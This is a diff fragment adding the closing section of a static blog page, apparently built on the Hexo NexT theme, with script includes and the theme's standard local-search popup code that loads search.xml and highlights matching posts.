+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
